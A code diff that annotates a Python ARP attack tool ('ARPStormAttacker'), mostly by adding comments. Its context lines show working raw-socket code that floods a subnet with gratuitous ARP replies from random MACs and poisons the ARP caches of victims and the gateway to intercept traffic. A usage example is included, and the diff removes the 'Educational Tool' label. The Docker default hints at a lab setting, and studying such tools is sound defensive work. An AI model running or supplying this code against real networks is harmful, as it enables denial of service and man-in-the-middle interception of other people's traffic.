@@ -115,19 +115,19 @@ class ARPStormAttacker:
     def __init__(self, interface: str = "eth0"):
         # Default to 'eth0' for Docker containers
         self.interface = interface
-        self.running = False
-        self.threads = []
+        self.running = False # flag to control attack threads
+        self.threads = [] # list of active threads
         self.packet_count = 0
-        self.lock = threading.Lock()
-        
+        self.lock = threading.Lock() # to ensure thread safe access
+
     def ip_to_bytes(self, ip: str) -> bytes:
-        """Convert IP string to bytes"""
-        return socket.inet_aton(ip)
+        """Convert IP string to bytes to 4 byte packed binary"""
+        return socket.inet_aton(ip) # uses this for standardization
     
     def mac_to_bytes(self, mac: str) -> bytes:
         """Convert MAC string to bytes"""
-        return bytes.fromhex(mac.replace(':', '').replace('-', ''))
-    
+        return bytes.fromhex(mac.replace(':', '').replace('-', '')) # removes separators :,- before conversion
+
     def random_mac(self) -> bytes:
         """Generate random MAC address"""
         return bytes([random.randint(0, 255) for _ in range(6)])
@@ -141,24 +141,24 @@ class ARPStormAttacker:
         # Gratuitous ARP: sender announces its own IP-MAC mapping
         arp = ARPPacket(
             operation=2,        # ARP Reply
-            sha=sender_mac,     # Sender MAC
-            spa=sender_ip,      # Sender IP
-            tha=b'\x00' * 6,   # Target MAC (broadcast/ignored)
+            sha=sender_mac,     # Sender MAC, sender hardware address
+            spa=sender_ip,      # Sender IP, sender protocol address
+            tha=b'\x00' * 6,   # Target MAC (broadcast/ignored),  Target hardware address (set to all zeros, which is standard for gratuitous ARP)
             tpa=sender_ip       # Target IP (same as sender - gratuitous)
         )
-        return arp.pack()
+        return arp.pack() # Converts the ARP packet object to raw bytes for transmission
     
     def create_poisoning_arp(self, target_ip: bytes, fake_mac: bytes, 
                            victim_ip: bytes) -> bytes:
         """Constructs an ARP reply faking the mapping to poison attack"""
         arp = ARPPacket(
-            operation=2,        # ARP Reply
-            sha=fake_mac,       # Fake MAC
-            spa=target_ip,      # Target IP we're impersonating
-            tha=b'\xff' * 6,   # Broadcast
-            tpa=victim_ip       # Victim IP
+            operation=2,        # ARP Reply , sender claims that he owns the IP address
+            sha=fake_mac,       # Fake MAC, sender hardware address
+            spa=target_ip,      # Target IP we're impersonating, the target
+            tha=b'\xff' * 6,   # Broadcast, we have to send to everyone that address belongs to me
+            tpa=victim_ip       # Victim IP, actually the server
         )
-        return arp.pack()
+        return arp.pack() # convert the ARP packet object to raw bytes for transmission
     
     def create_ethernet_frame(self, arp_payload: bytes, 
                             src_mac: bytes = None, 
@@ -168,8 +168,8 @@ class ARPStormAttacker:
             src_mac = self.random_mac()
         
         eth_frame = EthernetFrame(dst_mac, src_mac)
-        return eth_frame.pack() + arp_payload
-    
+        return eth_frame.pack() + arp_payload # the arp payload goes with the ethernet frame headers
+
     def storm_worker(self, target_subnet: str, duration: int, packets_per_second: int):
         """Worker thread for ARP storm
         creates (optionally bound to interface) raw socket
@@ -178,24 +178,30 @@ class ARPStormAttacker:
         try:
             # Create raw socket
             sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+            # creates a raw socket capable of sending Ethernet frames
+            # AF_PACKET allows us to send raw Ethernet frames
+            # SOCK_RAW provides raw network protocol access
             if self.interface:
-                sock.bind((self.interface, 0))
-            
+                sock.bind((self.interface, 0)) # binds the socket to specific network interface
+
             interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
             start_time = time.time()
+            # controls the intervals
             
             print(f"[*] Storm worker started - Target: {target_subnet}.0/24")
             
             while self.running and (time.time() - start_time) < duration:
+                # while self running is true, that means attack flag is on,and elapsed time < duration
                 try:
                     # Generate random source MAC and IP
                     src_mac = self.random_mac()
                     src_ip = self.random_ip(target_subnet)
-                    
+                    # random source mac and random IP for the subnet
+
                     # Create gratuitous ARP
                     arp_payload = self.create_gratuitous_arp(src_ip, src_mac)
                     frame = self.create_ethernet_frame(arp_payload, src_mac)
-                    
+                    # make an ethernet frame to transfer
                     # Send packet
                     sock.send(frame)
                     
@@ -226,16 +232,18 @@ class ARPStormAttacker:
             if self.interface:
                 sock.bind((self.interface, 0))
             
-            start_time = time.time()
+            start_time = time.time() # start time for duration control
             fake_mac = self.random_mac()
-            
+            # a fake mac address to use for poisoning
+
             print(f"[*] Poison worker started - Targets: {len(target_ips)} IPs")
             
             while self.running and (time.time() - start_time) < duration:
+                # while self running is true, that means attack flag is on,and elapsed time < duration
                 for target_ip in target_ips:
                     if not self.running:
-                        break
-                    
+                        break # checks for early termination signal
+
                     try:
                         # Poison target about gateway
                         arp_payload = self.create_poisoning_arp(
@@ -243,6 +251,8 @@ class ARPStormAttacker:
                             fake_mac,
                             self.ip_to_bytes(target_ip)
                         )
+                        # the dateway ip belongs to fake_mac, and the target ip is the victim
+                        # victims ARP cache now maps gateway IP - attacker Mac (Fake)
                         frame = self.create_ethernet_frame(arp_payload, fake_mac)
                         sock.send(frame)
                         
@@ -252,6 +262,8 @@ class ARPStormAttacker:
                             fake_mac,
                             self.ip_to_bytes(gateway_ip)
                         )
+                        # the victim ip is mapped to fake_mac
+                        # gateway ARP cache now maps victim IP - attacker Mac (Fake)
                         frame = self.create_ethernet_frame(arp_payload, fake_mac)
                         sock.send(frame)
                         
@@ -291,11 +303,13 @@ class ARPStormAttacker:
         
         # Start worker threads
         for i in range(num_threads):
+            # for each thread
             thread = threading.Thread(
                 target=self.storm_worker,
                 args=(target_subnet, duration, packets_per_second)
             )
-            thread.daemon = True
+            # each thread runs with storm worker method
+            thread.daemon = True # makes threads daemonic, that means it exits when main program exits
             thread.start()
             self.threads.append(thread)
         
@@ -304,7 +318,7 @@ class ARPStormAttacker:
         try:
             while self.running and (time.time() - start_time) < duration:
                 time.sleep(5)
-                with self.lock:
+                with self.lock: # thread safe calculations
                     elapsed = time.time() - start_time
                     rate = self.packet_count / elapsed if elapsed > 0 else 0
                     print(f"[*] Packets sent: {self.packet_count}, Rate: {rate:.1f} pps, "
@@ -366,7 +380,7 @@ class ARPStormAttacker:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="ARP DoS via Gratuitous ARP Storm - Educational Tool",
+        description="ARP DoS via Gratuitous ARP Storm",
         epilog="Example: python arp_dos_storm.py --storm --subnet 192.168.1 --duration 30"
     )
     
